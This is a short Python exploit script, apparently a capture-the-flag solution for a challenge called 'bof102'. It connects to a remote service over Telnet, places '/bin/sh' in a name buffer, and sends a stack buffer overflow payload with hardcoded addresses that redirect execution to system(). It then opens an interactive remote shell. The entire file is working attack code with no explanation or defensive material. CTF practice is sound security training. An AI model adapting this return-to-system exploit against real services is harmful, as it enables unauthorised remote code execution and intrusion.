#!/usr/bin/env python3

from telnetlib import Telnet


# Connect to endpoint
tn = Telnet("bof102.sstf.site", 1337)

# Set name buffer as '/bin/sh'
tn.read_until(b"Name > ")
tn.write(b"/bin/sh" + b"\n")

# Setup BOF payload
payload = b"A" * (16 + 4)		# Fill payload and ebp memory space
payload += b"\xe0\x83\x04\x08"	# Set address of system
payload += b"C" * 4 			# Set returm address for system
payload += b"\x34\xa0\x04\x08"	# Set argument for system

# Trigger BOF
tn.read_until(b" > ")
tn.write(payload + b"\n")

# Interaction with /bin/sh
print("Payload launched successfully, remote shell created!")
tn.interact()